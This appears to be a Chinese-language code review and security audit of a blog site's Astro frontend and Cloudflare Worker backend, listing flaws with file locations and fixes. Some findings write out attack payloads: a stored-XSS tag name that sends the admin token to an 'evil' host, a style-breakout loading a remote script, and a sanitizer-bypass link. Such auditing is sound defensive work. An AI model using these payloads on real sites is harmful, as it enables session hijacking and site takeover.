# 代码审查报告 — blog_website（全量源码）

- **日期**：2026-10-17
- **审查版本**：`fae355d`（HEAD，main 分支；工作区干净，仅新增未跟踪的 `.agents/`、`skills-lock.json`，为技能安装产物，不在范围内）
- **范围**：`src/**`、`worker/**`、`scripts/**`、根与 worker 配置（`astro.config.mjs`、`tsconfig.json`、`wrangler.jsonc`）、`.github/workflows/deploy.yml`，约 9,000 行首方代码；不含 `node_modules`、`dist/`、工具目录
- **方法**：按 `code-review` 技能的「两轴并行子代理」做法改造为全量审查 —— 4 个并行只读审查子代理（标准轴：前端 / 后端；安全轴：前端 / 后端），关键发现由主审查员回读源码复核（下文标【已复核】之处）
- **两轴说明**：本仓库没有 issue tracker / spec（未运行 `/setup-matt-pocock-skills`），故跳过 Spec 轴；标准轴以 README 的已文档化约定 + Fowler 坏味道基线为依据
- **工具链现状**：无测试、无 lint/formatter 配置、CI 无质量门禁，仅 TS strict；`dist/` 构建产物被提交进 git
- **副作用说明**：为避免修改已提交的 `dist/`，审查期间未执行 `npm run build`；代码与 `dist/` 在当前提交一致（= 已部署内容）

---

## 工具链验证（只读）

**`cd worker && npx tsc --noEmit`（strict）→ 3 处编译错误：**

1. `worker/src/handlers/admin.ts(35,37)` — `Object.keys(row)`，`row` 为 `unknown`（错误位置恰在下文 SQL 列名拼接处，与安全轴 M1 同源）
2. `worker/src/handlers/admin.ts(36,38)` — `Object.values(row)`，同上
3. `worker/src/services/article_service.ts(195,3)` — 返回值 `ArticleDetail` 缺少 `Article` 类型的 `category_id`、`updated_at` 两个字段

**根目录 `astro check`**：`@astrojs/check` 未安装，跳过（建议补装并纳入 CI，见标准轴发现）。

---

## 标准（Standards）轴

### 前端部分（src/、astro.config.mjs、scripts/）

> 总体印象：仓库把「有文档」做得很扎实（README 覆盖结构、渲染模式、i18n、设置体系），页面级安全修复（escape、CSP）也留下了清晰的审计注释。但文档与实现已出现系统性漂移：文档列出的组件/工具模块大面积成为死代码，同一职责（卡片渲染、分页、转义、主题、设置装载）在 3–5 处各写一份。i18n 约定在 islands 与后台外观面板基本失守。以下按严重程度排序。

#### P0 正确性

**1. CSP 缺 `frame-src`，文章页 B 站/YouTube 嵌入必然被拦截（硬伤+文档冲突）**【已复核】
`src/middleware.ts:14-23` 与 `public/_headers:4` 的 CSP 只有 `default-src 'self'`，注释自称放行「文章内音视频」，但 `src/pages/articles/[slug].astro:343-347` 注入的是 `https://player.bilibili.com` / `youtube.com` **iframe**，落入 default-src 被拦。影响：最近交付的媒体卡片功能在线上不可用；README:287-296 智能代理承诺无法兑现。建议：两处 CSP 同步补 `frame-src https://player.bilibili.com https://www.youtube.com`。

#### P1 违反文档标准

**2. i18n 约定在 islands 与后台外观面板失守**
README:443-444 规定「前台 JS 动态内容用 t()，后台 Vue 组件直接调用 t()」。但 `CommentSection.vue:3,16,44`、`SearchBox.vue:7,25-26,40`、`FriendLinkList.vue:3,11`、`ThemeToggle.vue:37-39` 全部硬编码中文；`App.vue:304-415`（「外观与个性化」「导出/恢复默认」等整段）同样硬编码，连 `App.vue:629 alert('您没有权限访问此页面')` 也是。影响：双语/文案覆盖功能对这些模块完全无效，且 zh.json 中已备好的 `comment.*`、`like.*`、`page.search_placeholder` 等键（zh.json:42-54）成为死键。建议：islands 改用 t()，启动 `setLocale` 后监听 `locale-changed` 重渲染。

**3. 转义工具「多版本并存」且有一处漏转义**【已复核，见安全轴 H1】
`escape.ts:3-9` 明确约定「API 文本拼 innerHTML 必须先过 escapeHtml/escapeAttr」。实际：`tags/index.astro:94` 直接 `${tag.name}` 未转义（同类页面 `categories/index.astro:125` 却转义了）；`tags/[slug].astro:58-60` 的局部 `esc()` 只转 4 字符（漏 `'`——charset 修复刚全仓做过）；`search.astro:117-124` 另有一份；`index.astro:214`/`articles/index.astro:67` 还有 `const escAttr = escapeAttr` 无意义别名。影响：转义强度取决于写成哪一天，XSS 回归风险面较大。建议：删除全部局部变体，统一走 escape.ts。

**4. README 文档化的组件与工具模块是死代码**
- `ArticleCard.astro`/`EmptyState.astro`/`Pagination.astro`（README:37-41）零引用：卡片与分页在各页手写模板（见 #8）。README:44 的 `Sidebar.astro` 甚至不存在。
- `utils/theme.ts`（46 行）、`utils/siteConfig.ts`、`utils/api.ts` 全部零调用方（grep 证实）；BaseLayout 内联重写了主题/站点配置逻辑（BaseLayout.astro:156-259、277-324），App.vue:635-656 自建 `api()`。且两套 token key 不一致：api.ts:23 用 `auth_token`，App.vue:539 用 `admin_token`。影响：改主题/配置逻辑要改 3 个地方，文档的「单一工具」形同虚设。建议：要么删文档所列死模块，要么让 BaseLayout/App.vue 回接。

**5. README API 表与前端实际调用漂移**
README:192-199 写编辑锁路径 `/articles/:id/lock`，前端与 Worker 实际是 `edit-lock`（App.vue:746,816,1279；worker/src/router.ts:148-151）；README:167 称 `/settings` 为公开接口，实际安全修复后前端/Worker 均已改为 `/settings/public`（settings.ts:231、BaseLayout.astro:45）。影响：照文档接入的工具必然 404/401。建议：同步 README。

#### P2 正确性/一致性

**6. `data-i18n-params` 无人消费，标签/分类页 H1 被写坏**：`tags/[slug].astro:12`、`categories/[slug].astro:12` 标记了参数，但 `i18n.ts:62-66` 只做 `textContent = t(key)`，会把「标签: abc」覆写为字典原文 `标签: {name}`。建议：refreshDomTranslations 解析 params，或去掉 data-i18n。

**7. 站点标题硬编码绕开配置体系**：`articles/[slug].astro:84` 拼 `| Blog`、`rss.xml.ts:15-16` 写死 `'Blog'`/`'A personal blog'`，均不读 `/api/v1/config`，与 README:315-328「site_title 应用于页面标题」不符。日期本地化也不一致：islands 固定 `zh-CN`（SearchBox.vue:135、CommentSection.vue:124），页面脚本却按 `getLocale()` 切换（index.astro:197）；`<html lang="zh-CN">`（BaseLayout.astro:57）切英文后不变。

#### P3 基线坏味道（判断性）

**8. Duplicated Code（最广泛）**：卡片模板 4 份（index.astro:216-243、articles/index.astro:69-96、tags/[slug].astro:84-103、categories/[slug].astro:80-98），分页模板 3 份（对应 99-115 / 105-121 / 100-116）；App.vue:758-776 与 786-806 编辑器填充块逐字重复、设置装载块 3 份（993-999/1047-1054/1069-1076）；Markdown 管线 2 份（App.vue:514-521 vs utils/markdown.ts:5-18，且 App 版丢了 try/catch）。建议：复活 ArticleCard/Pagination 组件、抽 `openArticleEditor(a)`/`applyServerSettings(data)`。

**9. Divergent Change**：BaseLayout.astro 792 行混合主题、语言、标题挽留、siteConfig、settings、motion、一言组件（内联自定义元素+代理逻辑）、img-proxy、favicon 灯泡；App.vue 1864 行兼具 SPA、设置预览与编辑器。建议：一言组件、settings 预取拆独立模块。

**10. Repeated Switches**：App.vue:618 `adminOnlyTabs` 与 606-615 `navItems.minRole` 双份角色表，switchTab:627-633 再查一次。建议：单一来源。

**11. Data Clumps / Shotgun Surgery**：`WORKER_ORIGIN` 硬编码 2 处（rss.xml.ts:6、api/v1/[...path].ts:3），生产域名在 astro.config.mjs 出现 3 次（13/23/38）；CSP 整串在 _headers 与 middleware.ts 重复声明。换域名/调 CSP 需多处联动。

**12. Speculative Generality**：`src/content/config.ts` 的 blog collection（pubDate/draft 等字段）无任何 getCollection 使用；package.json:24-26 的 `uuid`、`vue-router` 零引用；scripts/*.mjs 依赖 playwright 但未列入 devDependencies（照注释运行会失败）。

### 后端部分（worker/、配置、CI）

> 总体印象：整体结构清晰——router 集中注册、统一 `{code,message,data}` 信封、middleware 分层、strict TS，全部 handler 导出均已在 router 注册（55 条路由无孤儿导出）。但所有权校验在 comment/media 上存在**真实缺口**，README 路由表与实现明显漂移，且「查用户名→id」同一查询散落 9 处，属于典型的共享形状未抽取。

#### A. 违反已文档化标准 / 文档-实现冲突（按严重度）

1. **匿名可列举草稿**【已复核】：README:154 把 `status=all` 列为公开能力，实现 `article_service.ts:43-46` 对匿名请求不设 status 过滤，`GET /articles?status=all|draft` 直接返回全部草稿，与「未发布文章仅作者与管理员可访问」（README 后台管理节、commit 28fa575 的详情拦截）冲突。影响：草稿内容泄露；建议 status≠published 时强制登录+所有权收窄。
2. **评论审核无所有权校验**【已复核】：README:184/252 明确「editor 仅自己文章的评论」，`comment.ts:98-122` approve/reject/delete 只按 id 全局更新，router:105-107 仅 requireAuth。editor 可审核/删除他人文章评论。
3. **媒体删除无所有权校验**【已复核】：README:253/190「editor 仅自己上传的」，`media.ts:97-107` 无校验且直接物理删 KV；router:116 仅 requireAuth。
4. **README 路由表 vs router 差异**（对照约 40 条）：① README:163 `GET /articles/:article_id/view` 不存在，阅读量逻辑并入 `GET /articles/:slug`（article.ts:57-65）；② 编辑锁 4 条路径 README（196-199）写 `/articles/:id/lock`，实际注册 `/articles/:id/edit-lock`（router:148-151）；③ README:167 把 `GET /settings` 列为公开，实现为 admin（router:132），公开入口是未文档化的 `/settings/public`（router:131）；README:285 同句「/settings 作为公开接口」已过期。
5. **db:init 与 README 直接矛盾**：README:368「必须使用 --remote」，`worker/package.json:8` 的 `db:init` 无 `--remote`，会静默写本地库。
6. **两套 wrangler 配置并存矛盾**：README:82 称 `worker/wrangler.toml`「已弃用、jsonc 实际生效」，但 toml 仍在且 name=`blog_website`、缺 `EDIT_LOCK`/`RATE_LIMIT` 绑定（worker/wrangler.toml:1-14 vs wrangler.jsonc:1-29）；部署名要求 `blog-api`（README:396），旧文件是部署隐患。建议删除 toml。
7. 小项：README:127「共 9 张表」实为 10 张；README:392 只列 2 个 KV，实际 3 个（RATE_LIMIT，wrangler.jsonc:22-25）；项目结构中缺 `security_headers.ts`。

#### B. 基线坏味道

1. **Duplicated Code（最重）**：`SELECT id FROM users WHERE username = ?` 出现 9 次（article_service.ts:32、edit_lock_service.ts:8/13、article.ts:48、comment.ts:79、media.ts:43/73、category.ts:43/62、tag.ts:43），应抽 user 查询函数；`getJwtSecret` 重复两份（auth.ts:126 vs auth_handler.ts:5），handleLogin 内部又三处重复取 secret（auth_handler.ts:34/52/65）。
2. **Duplicated Code**：`hashIp` 两份仅 salt 不同（comment.ts:124、like.ts:4，salt 为魔法字符串）；`escapeHtml` 在 search.ts:51 重抄 sanitizer.ts:35；`handleUpdateSettings`/`handleImportSettings` 除文案外完全相同（settings.ts:186-195 vs 213-221）。
3. **Duplicated Code + handler 依赖 handler**：img_proxy/text_proxy 整体同构（校验→限流→KV→fetch→大小检查，img_proxy.ts:64-163 / text_proxy.ts:62-146，后者还从前者 import 10 个符号）；deploy.yml 整段部署流程重复两遍（30-36/42-47 vs 52-58/60-65）。
4. **Speculative Generality / 死代码**：`buildLikeClause` 定义未用（search.ts:29-49）；`ALLOWED_TAGS/ALLOWED_ATTR` 导出却无人使用，且 `sanitizeHtml` 实为正则黑名单——名字误导（sanitizer.ts:1-12/14-29）；article.ts:4 导入 `sanitizeHtml` 未用；media.ts:110 `params.key` 兼容分支无对应路由。
5. **Primitive Obsession / 魔法值**：`category_id || 1` 与内联「未分类 {id:1,…}」在 article_service.ts:101/144/180/219 四处重复，与 UpdateArticleRequest 允许 null 语义冲突（null 被改写为 1）；`/api/v1/...` 硬编码拼 URL（media.ts:53/89）绕过 `API_PREFIX` 却另在 media_asset 模型外维护。
6. **Divergent Change**：article_service.ts 同时管 slug 生成、阅读时长、浏览计数、所有权、标签、列表 SQL（5+ 类变更原因）；search.ts 混合分词/转义/高亮/FTS-降级两条路径。
7. **Feature Envy**：handleGetArticle 内联复刻 `checkArticleOwnership`（article.ts:44-51）；各 handler 自行拼 users 查询（见 B1）。

#### C. 跨层一致性问题

1. **所有权校验惯例不一**：article=service 函数、category/tag=内联且 fail-open（`if (user && …)`，category.ts:62-65，查不到 user 即放行）、comment/media=缺失；edit_lock 用 403 表示未认证而 middleware 用 401（edit_lock.ts:6 vs auth.ts:108）。
2. **错误码惯例不一**：slug 重复→CONFLICT（article.ts:89）而用户名重复→VALIDATION_FAILED（auth_handler.ts:109）；img/text-proxy 直接拿 HTTP 状态当 `code`（img_proxy.ts:69/137，400/415/502 与 ErrorCodes 体系混用）；router:191-194 的兜底 500 回显原始 `errMsg`，而 `serverError()` 有脱敏默认值。
3. **分页形状 3 种**：`paginatedResponse` 含 total_pages（仅文章用）；comments/media 手写 items+total 无 total_pages（comment.ts:24-29、media.ts:86-94）；search 另加 query（search.ts:135-141）；`GET /comments` 甚至只回裸数组无 total（comment.ts:95）。
4. **schema ↔ model ↔ 文档**：category/tag 模型缺 `created_by`、media_asset 模型缺 `uploaded_by`（schema.sql:191/196/200-201 用 ALTER 补，模型未同步）；schema.sql 非幂等（末尾 ALTER 重跑即报错）；FTS 同步不完整：触发器只挂 articles，新建文章先 INSERT 文章后插 article_tags，tags 永不入索引，且 delete 触发器以 `''` 冒充原值（schema.sql:130-157 vs article_service.ts:185-192）；`comment_count` 仅 approve 时重算，reject/delete 不重算（comment.ts:103 vs 108-122）。
5. **限流惯例**：rate_limit 以 `pathname.includes()` 猜路由（rate_limit.ts:42-51），`POST /settings/import` 落到 GET 档 60/min；IP 解析函数两份且头顺序不同（rate_limit.ts:17 vs img_proxy.ts:50）。

### 标准轴小结

前端约 20 项、后端约 22 项发现。**前端最严重**：CSP 缺 `frame-src` 导致文章媒体嵌入被浏览器拦截（功能性回归），以及转义/i18n/文档约定的系统性漂移；**后端最严重**：评论审核与媒体删除缺 editor 所有权校验（与 README 明示规则冲突），其次匿名可列举草稿与 README/实现/配置的全面漂移。

---

## 安全（Security）轴

### 后端部分（worker/**、配置、CI）

> 总体评估：代码整体基本功较好——D1 查询几乎全部参数化、JWT 用 WebCrypto HMAC 手写实现（无算法混淆面）、CORS/安全头在 fae355d 后已收敛、上传与代理均有白名单。主要短板集中在三处：**默认凭据与口令学（SHA-256 无盐、changeme、无锁定）**、**editor 授权矩阵不完整（评论/媒体缺失所有权校验）**、**列表接口 status 默认值失效导致草稿元数据匿名泄露**；代理的 SSRF 校验存在重定向绕过与"先下载后限大小"。无 RCE/命令注入路径。

#### Critical

**C1【已确认】默认管理员口令 changeme + 无慢哈希 + 无强制改密/锁定**【已复核 schema.sql:188】
- 位置：`worker/schema.sql:188`、`worker/src/handlers/auth_handler.ts:13-18,33`
- 证据：`INSERT ... ('admin','5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8',...)`（即 SHA-256("changeme")）；`return crypto.subtle.digest('SHA-256', data)`（无盐单轮）。
- 可利用性：公网先试 changeme 即可拿 admin；即改密，任何一次 DB/导出泄露（`/admin/export` 含哈希）都可离线秒破；登录限流 120/min/IP、无锁定、无验证码。
- 修复：首登强制改密；改 bcrypt/argon2 或至少 PBKDF2+随机盐；失败锁定。

#### High

**H1【已确认】匿名可拉取未发布文章列表（草稿元数据泄露）**【已复核 article.ts:23 + article_service.ts:37,43-46】
- 位置：`worker/src/handlers/article.ts:23`、`worker/src/services/article_service.ts:37,43-46`
- 证据：handler 传 `status = url.searchParams.get('status') || ''`；service 解构默认值 `status = 'published'` 对 `''` 不生效，`if (status && status !== 'all')` 直接跳过状态过滤。
- 可利用性：匿名 `GET /api/v1/articles`（或 `?status=draft`）即返回全部草稿的 title/slug/summary/cover/status（列表未含正文）；前端均显式传 `status=published`，所以站点页面看不出异常，属纯 API 层泄露。详情接口对草稿的拦截正常。
- 修复：handler 层不传空串（`status ?? undefined`）或 service 改为 `status || 'published'` 并校验枚举。

**H2【已确认】BOLA：editor 可审核/拒绝/删除任意评论、删除任意媒体**【已复核 router.ts:105-107,116；comment.ts:98-122；media.ts:97-107】
- 位置：`worker/src/router.ts:105-107,116`、`worker/src/handlers/comment.ts:98-121`、`worker/src/handlers/media.ts:97-107`
- 证据：三条评论路由仅 `requireAuth=true`（非 admin），且 handler 未接收 `authResult`，无任何 article.author_id/uploaded_by 比对；`handleListAllComments`/`handleListMedia` 却做了 editor 归属过滤——权限模型自相矛盾。
- 可利用性：任一 editor 账号即可删改全站评论、删除管理员上传的媒体（KV 文件一并删除，不可恢复）；配合 H1 拿到的草稿 id 可批量操作。
- 修复：approve/reject/delete/媒体删除统一加"admin 或资源作者"校验。

**H3【已确认】img/text-proxy SSRF 校验可绕过 + 无界缓冲（开放代理/资源耗尽）**
- 位置：`worker/src/handlers/img_proxy.ts:37-48,117-148`、`worker/src/handlers/text_proxy.ts:111-142`
- 证据：`redirect: 'follow'` 仅校验初始 URL，重定向后不再校验；`isBlockedIp` 对 `[::ffff:127.0.0.1]`（IPv4-mapped IPv6）不拦；`body = await upstream.arrayBuffer()` 在 `Content-Length` 检查之后、大小校验之前全量入内存，且 10s 超时在收到响应头后即清除（不覆盖 body 读取）。
- 可利用性：攻击者自控域重定向即绕过 `BLOCKED_HOST_RE`（CF 边缘下内网/元数据端点多数不可达，实际危害为受 MIME 限制的开放代理、探测跳板、带宽滥用）；恶意上游返回超大/长挂 body 可撑爆 Worker 内存（128MB）造成 502/计费放大。
- 修复：`redirect:'manual'` 并逐跳复用校验、解析后按 IP 复核（含 mapped 地址）；流式读取并在超限即中止，超时覆盖 body。

#### Medium

**M1【已确认】admin import 列名拼接 SQL 注入，且绕过内容净化**【已复核 admin.ts:35-38，与 tsc 报错同源】
- 位置：`worker/src/handlers/admin.ts:35-38`（另 `:32` 整表删除）
- 证据：`INSERT INTO ${table} (${columns.join(', ')})`——`columns` 直接来自请求 JSON 的键，无白名单/转义。
- 可利用性：需 admin 权限（不能提权到更高角色），但可执行任意 SQL、导入含 `jwt_secret`/`admin_password_hash` 的 site_config，或把未净化的 XSS 内容写入 comments/articles（诱导导入他人"备份文件"即中招）。
- 修复：列名白名单校验 + 逐表固定 schema；导入内容过 sanitize 并默认跳过 site_config 密钥行。

**M2【已确认】评论净化器为黑名单正则，可被实体编码绕过**
- 位置：`worker/src/utils/sanitizer.ts:17-26`
- 证据：`cleaned.replace(/javascript\s*:/gi,'')` 等按原文匹配，不做实体解码、无标签白名单（导出的 `ALLOWED_TAGS` 是死代码）；`href="&#106;avascript:alert(1)"` 可绕过。
- 可利用性：评论需 admin 审核后才展示，且前端若再用 DOMPurify（dist 内含）会二次消杀，实际危害取决于前端；但后端防线已形同虚设，属纵深防御失效。
- 修复：服务端白名单净化（或原样存储、统一由前端 DOMPurify 且注明）。

**M3【已确认（有缓解）】上传信任客户端 MIME，SVG/PDF 同源 serve，无 Content-Disposition**
- 位置：`worker/src/handlers/media.ts:6-9,25,32-34,119-123`
- 证据：`ALLOWED_MIME_TYPES.includes(file.type)`（multipart 自报）；`image/svg+xml`、`application/pdf` 在列；serve 时按 KV metadata 原样回 `Content-Type`，未设 `Content-Disposition`；`ext` 取文件名后缀未过滤（KV 为平面键空间，无穿越）。
- 可利用性：editor 上传含 `<script>` 的 SVG，用户直开 `/api/v1/media/serve/...` 即触非同源（若 /api 与站点同域则同源）存储型 XSS——目前**仅靠 fae355d 新加的 CSP `default-src 'none'` 缓解**（内联脚本被拦），属"侥幸安全"；PDF 可作站内钓鱼载体。
- 修复：加 `Content-Disposition: attachment`（或独立媒体域）、魔数嗅探、ext 白名单。

**M4【已确认】限流实现竞态、窗口过宽、可绕**
- 位置：`worker/src/middleware/rate_limit.ts:48-49,55-64`
- 证据：`get` 后 `waitUntil(put(current+1))` 非原子（并发可越限）；固定时间窗边界双配额；key 含完整 pathname，`POST /articles/{id}/comments` 换 id 即可突破 3/min；登录走 ADMIN 档 120/min；KV 跨 colo 最终一致；KV 读异常会整请求 500（fail-closed 但形成 DoS 面）。
- 修复：改用 Durable Object/限流 API 原子计数；登录单独 5-10/min；按端点而非完整路径分桶。

**M5【已确认】JWT 密钥明文存 DB、无轮换；exp 未校验类型**
- 位置：`worker/src/middleware/auth.ts:89,126-132`、`worker/schema.sql:171`
- 证据：`if (decoded.exp < now) return null`——`exp` 缺失/非数字时 NaN 比较为 false 直接放行；密钥从 `site_config` 明文读取；README:374 称"首次登录自动生成"，但全仓无生成逻辑，空值时所有登录 500（功能性缺陷）。
- 可利用性：任何 DB 读泄露（含 admin 导出、M1 注入）即得密钥→伪造任意用户 token；无 kid/轮换机制。
- 修复：密钥入 Workers Secret 环境变量、加 `typeof exp === 'number'` 校验、补生成与轮换流程。

#### Low

- **L1 错误回显**【已确认】：`router.ts:191-196` 500 返回原始 `errMsg`（D1/SQL 错误文本），`/health`（router.ts:76）回显 `String(e)`，`admin.ts:44` 同——泄露内部实现。建议统一泛化。
- **L2 媒体 serve 无速率限制且可枚举 KV**【已确认】：`media.ts:109-126` 匿名可探测任意 key（包括 `imgproxy/`、`textproxy/` 缓存键），GET 全被限流跳过；建议 GET 白名单前缀 + 可选限流。
- **L3 like 计数竞态**【已确认】：`like.ts:19-29` 读改写非事务，并发可重复计数/减为负数。
- **L4 授权矩阵不一致**【已确认】：`router.ts:139-143` friend-links 全 CRUD 仅需 editor（无归属概念），而 tags/categories 删除是 admin——按设计意图确认或收紧。
- **L5 搜索细节**【加固】：`search.ts:39` LIKE 的 `%`/`_` 未转义（通配符注入，非 SQLi）；`search.ts:149-167` 长查询最多 ~302 个绑定参数，可能触 D1 参数上限报 500。

#### Info

- `worker/wrangler.jsonc:5-26` 的 D1/KV 资源 ID 属部署标识而非机密（无账号 token 不可用），可保留；但 `worker/wrangler.toml` 陈旧重复且缺 EDIT_LOCK/RATE_LIMIT 绑定，易误用，建议删除。
- `.github/workflows/deploy.yml:11-13` `permissions` 最小化（contents:read/deployments:write）✅、secrets 规范 ✅；加固项：actions 未 pin SHA、`npm install` 而非 `npm ci`；`.gitignore` 建议补 `.dev.vars`（当前仓库无该文件）。
- 依赖粗判（基于 package.json 版本区间，未联网）：astro ^5.7 / vue ^3.5 / dompurify ^3.1 / marked ^14 / wrangler ^3.80 未见明确已知高危；caret 区间不利复现锁定。

#### fae355d 四项后端修复核对

1. **CORS 精确白名单** — ✅ 已验证：`cors.ts:11-29` 精确比对、移除 `*.pages.dev` 通配、`Vary: Origin`、预检不回显非法 Origin；无新问题（保留 localhost 白名单属 Info）。
2. **security_headers 全出口** — ✅ 已验证：`router.ts:160-196` 六个出口（OPTIONS/限流/404/401/403/处理/500）全部包裹；仅 `index.ts:21` 非 /api 404 未覆盖（不在 `/api/*` 路由范围，可接受）。
3. **/settings 收权 + /settings/public 投影** — ✅ 已验证【已复核 router.ts:130-137】：`/settings` 为 admin；`settings.ts:19-28` 白名单仅 theme/layout/background/features/motion/copy，无密钥；`/config` 仍公开 `is_public=1` 行，密钥行（jwt_secret/admin_password_hash）is_public=0，未泄露。
4. **搜索先转义再包 mark** — ✅ 已验证：`search.ts:67-76` 先 `escapeHtml` 再包 `<mark>`；FTS snippet 走 `sanitizeSnippet:86-92` 仅保留 mark。残留：占位符字符串碰撞最多注入无属性裸 `<mark>`（无害文案）属 Info。

#### 必查清单逐项结论

1. **认证与会话**：发现问题（C1/M5；JWT 本身无 alg/none 混淆面✅，但密钥管理、哈希、锁定不合格）。
2. **授权**：发现问题（H2 评论/媒体 BOLA；H1 列表状态过滤；articles/categories/tags(创建)/users/settings/config/edit_lock 校验到位✅；`/settings/public` 投影无泄露✅）。
3. **注入**：部分发现问题（M1 唯一拼接点；FTS/LIKE/所有 CRUD 均参数化✅；deepMerge 键白名单防原型污染✅；无模板/命令注入面✅）。
4. **SSRF**：发现问题（H3：redirect 跟随、mapped IPv6 绕过、先下载后限大小；请求头已净化✅、协议/MIME 白名单✅）。
5. **XSS/内容**：部分发现问题（M2 后端净化可绕；文章 `content_html` 服务端恒空、渲染在前端 marked+DOMPurify；M3 媒体同源矢量内容靠 CSP 缓解）。
6. **文件上传/路径**：基本通过（类型/大小/键名有校验；ext 未过滤但 KV 平面键无路径穿越✅）。
7. **限流**：部分通过（覆盖全部写操作+search+登录✅；竞态/窗口/分桶/登录阈值见 M4）。
8. **CORS 与安全头**：通过（cors.ts 逻辑正确；API CSP `default-src 'none'` 不误伤 JSON/媒体✅；缺 HSTS 属加固）。
9. **信息泄露与错误处理**：发现问题（L1 错误回显；导出含 jwt_secret+无盐哈希；日志仅 errMsg 无敏感信息✅；`/users`、`/config/all` 均 admin✅）。
10. **全局**：基本通过（wrangler ID 非敏感、toml 重复陈旧；deploy.yml 权限最小✅；依赖粗判无已知高危）。

### 前端部分（src/**、public/_headers）

> **审查基线**：`git rev-parse HEAD` = `fae355d`，工作区干净（仅 `.agents/`、`skills-lock.json` 未跟踪），故所审代码 = 已部署代码（`dist/` 亦为同提交产物）。
>
> **总体态势**：上一轮修复方向正确、覆盖面较广（模板转义、搜索高亮、响应头、设置鉴权投影），搜索高亮链路与图片代理降级逻辑经核对无问题。但修复**未覆盖 `tags/index.astro`**，形成一条已构建进 `dist/` 的存储型 XSS（低权作者 → 可窃取同源 `localStorage.admin_token` → 管理员接管），是本轮最严重问题。此外「admin 可写内容」（设置值、i18n 文案覆盖）被系统性地当作可信输入直接进入 `set:html`/`innerHTML`，构成全站访客级的注入面，且新增 CSP 因 `'unsafe-inline'` + 缺 `frame-src` 既无法遏制注入、又破坏了站内视频嵌入。

#### High

**H1 标签页列表未转义 → 存储型 XSS（fae355d 遗漏点）【已确认漏洞】【已复核 src/pages/tags/index.astro:92-97，该文件未引入 escape.ts】**

`src/pages/tags/index.astro:92-97`（部署产物 `dist/_assets/index.astro_astro_type_script_index_0_lang.CT_CtEn8.js` 同）

```js
container.innerHTML = tags.map((tag: any) => `
  <a href="/tags/${tag.slug}" class="tag-item">
    <span>${tag.name}</span>
```

`loadTags()` 中 `tag.slug`/`tag.name` **零处理**进入 `innerHTML`（该文件仅 import `t, getLocale`，未引入 `escape.ts`）。
**可利用性**：`POST /api/v1/tags` 仅 `requireAuth`（`worker/src/router.ts:99`）不要求 admin；`name` 只校验长度 1–50（`worker/src/handlers/tag.ts:22-25`），无字符过滤。任一持有 editor 账号者创建名为 `<img src=x onerror=fetch('//evil/?t='+localStorage.admin_token)>` 的标签，任何访客（含管理员）打开 `/tags` 即执行；因与 `/admin` 同源，可直接读取 `admin_token`（`src/admin/App.vue:539`）→ 管理员会话完全接管。**修复**：改用 `escapeHtml(tag.name)` + `safePathSegment(tag.slug)`，与其它页面统一。

#### Medium

**M1 设置值原样拼 CSS 并经 `set:html` 注入 `<style>` → SSR 页面 HTML/脚本注入【已确认漏洞（前提 admin）】【已复核 settings.ts:161-196 与 BaseLayout.astro:87】**

`src/utils/settings.ts:174,180,206`；`src/components/layout/BaseLayout.astro:53,87`

```js
lines.push(`  --bg-image: url("${bg.bgImage}") !important;`);   // 值未做任何校验
<style id="dynamic-settings" set:html={initialCss}></style>    // 原始 HTML 插入
```

**可利用性**：`PUT /settings`、`POST /settings/import` 均 `requireAdmin`（`router.ts:134,137`）→ 攻击者 = admin（或已窃取的 admin 会话）。`bgImage` 设为 `x")} </style><script src=//evil/x.js></script><style>` 即在所有 SSR 页（`/articles/*`、`/tags/*`、`/categories/*`）执行脚本（CSP 含 `'unsafe-inline'` 不拦）；即便不逃逸，CSS 注入仍可 `url()` 外联泄露访客 IP、伪造 UI。同类未校验字段：全部色值、`layout.*`、`radius*`。**修复**：按字段正则白名单（色值 `^#[0-9a-fA-F]{3,8}$`、尺寸 `^\d+(px|rem|em|%)$`）并对 `bgImage` 做 URL 白名单。

**M2 i18n 文案覆盖未转义即入 `innerHTML` → 存储型 XSS（全站访客）【已确认漏洞（前提 admin）】**

`src/utils/i18n.ts:41` + `src/pages/archives.astro:109`（另 `index.astro:210`、`articles/index.astro:63,118`、`tags/index.astro:85` 等同型）

```js
text = overrides[currentLocale]?.[key] || messages[currentLocale]?.[key] || ...
html += `<h3 class="archive-month">${t(`month.${month}`)}</h3>`;   // 直接进 innerHTML
```

**可利用性**：`applySettings` 以 `setOverrides(s.copy)` 落覆盖层（`settings.ts:223`），`copy` 属公开投影字段。设置 `copy.zh['month.01'] = "<img src=x onerror=...>"` 后 `/archives` 每位访客执行（该分支恒走）。前提同 M1（admin 写设置）。`refreshDomTranslations` 用 `textContent`（这部分是对的）。**修复**：`innerHTML` 路径统一 `escapeHtml(t(...))`，或提供语义明确的 `tHtml()`。

**M3 新增 CSP 缺 `frame-src` 破坏站内视频嵌入；`'unsafe-inline'` 使 CSP 无法遏制上述注入【引入新问题（功能性）】【已复核 middleware.ts:14-23 与 articles/[slug].astro:343-347】**

`src/middleware.ts:15-18`、`public/_headers:4`、`src/pages/articles/[slug].astro:343-348`

```
"default-src 'self'; script-src 'self' 'unsafe-inline'; ..."   // 无 frame-src
f.src = embedUrl;  // https://player.bilibili.com/... 或 youtube.com/embed/...
```

`frame-src` 回退 `default-src 'self'` → 文章媒体卡片的 B 站/YouTube iframe 被浏览器拦截（功能失效，非漏洞，但属本修复引入的回归）。`'unsafe-inline'` 同时放行 `onerror` 型注入，令 M1/M2 的载荷可执行。**修复**：显式 `frame-src https://player.bilibili.com https://www.youtube.com`，并评估 nonce/hash 方案。

#### Low

- **L1 设置形状未校验 → SSR 全站 500（admin 自伤/恶意配置导入）**：`BaseLayout.astro:48-53`：`initialSettings = data.data;` 在 `try` 内，但 `const initialCss = buildCss(initialSettings);` 在 `try` **之外**；`settings.ts:180` 对 `theme.light` 直接 `Object.entries`。后端 `deepMerge` 允许类型覆盖（`{"theme":"x"}` → `s.theme.light === undefined`）→ 抛错；BaseLayout 被所有页面复用，SSR 全站报错。修复：`buildCss` 内 try/catch + 形状校验，失败回落默认。
- **L2 admin 好友链接 `target="_blank"` 无 `rel` 且未限 scheme**：`src/admin/App.vue:274` `<a :href="fl.url" target="_blank">`（对比 `src/islands/FriendLinkList.vue:6` 已带 `rel="noopener noreferrer"`）→ 反向标签劫持可改写后台页，或 `fl.url="javascript:..."` 在后台上下文执行；前提=admin 写好友链接。修复：补 `rel="noopener noreferrer"` 并校验 `https?://`。
